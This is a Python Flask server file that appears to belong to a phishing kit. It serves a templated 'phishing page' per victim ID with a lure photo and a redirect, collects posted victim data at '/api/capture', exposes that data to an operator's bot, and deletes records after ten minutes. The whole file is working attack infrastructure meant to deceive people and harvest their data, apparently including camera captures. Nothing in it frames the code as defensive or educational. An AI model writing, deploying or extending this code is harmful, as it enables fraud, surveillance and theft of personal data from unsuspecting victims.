from flask import Flask, request, jsonify
import requests
import time
import threading
import base64
import os
from config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL

app = Flask(__name__)

victim_data = {}
user_redirects = {}
user_photos = {}

# ========== PHISHING PAGE ==========
@app.route('/p/<uid>')
def phishing_page(uid):
    victim_id = request.args.get('v', 'unknown')
    target_type = request.args.get('type', 'cam')
    redirect_url = user_redirects.get(victim_id, 'https://google.com')
    photo_url = user_photos.get(victim_id, 'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=No+Photo')
    
    with open('web/index.html', 'r') as f:
        html = f.read()
    
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    html = html.replace('{{PHOTO_URL}}', photo_url)
    return html

# ========== STORE PHOTO ==========
@app.route('/store_photo/<victim_id>', methods=['POST'])
def store_photo(victim_id):
    data = request.json
    if data and data.get('photo_url'):
        user_photos[victim_id] = data['photo_url']
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ========== SET REDIRECT ==========
@app.route('/set_redirect/<victim_id>', methods=['POST'])
def set_redirect(victim_id):
    data = request.json
    if data and data.get('url', '').startswith('http'):
        user_redirects[victim_id] = data['url']
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ========== CAPTURE DATA ==========
@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    victim_id = data.get('victim_id')
    if not victim_id:
        return jsonify({"status": "error"}), 400
    
    victim_data[victim_id] = data
    victim_data[victim_id]["time"] = time.time()
    
    # Forward to bot
    forward_to_bot(data)
    return jsonify({"status": "ok"})

def forward_to_bot(data):
    """Send data to bot via API"""
    try:
        # Call bot's forward function via webhook
        # We'll use the bot's send_message as trigger
        victim_id = data.get('victim_id')
        # Store in a queue and bot will pick it up
        # For now, we'll just print
        print(f"📥 Data from {victim_id}")
        
        # Try to send to bot via API
        # Bot will pick up from victim_data
        pass
    except Exception as e:
        print(f"Forward error: {e}")

# ========== GET VICTIM DATA (for bot) ==========
@app.route('/get_victim_data/<victim_id>')
def get_victim_data(victim_id):
    data = victim_data.get(victim_id)
    if data:
        return jsonify(data)
    return jsonify({"status": "not found"}), 404

# ========== CLEAN OLD DATA ==========
def clean_data():
    while True:
        time.sleep(600)
        now = time.time()
        to_del = [k for k, v in victim_data.items() if now - v.get("time", 0) > 600]
        for k in to_del:
            del victim_data[k]
            if k in user_photos:
                del user_photos[k]
            if k in user_redirects:
                del user_redirects[k]
        print(f"🧹 Deleted {len(to_del)} old victim data")

threading.Thread(target=clean_data, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
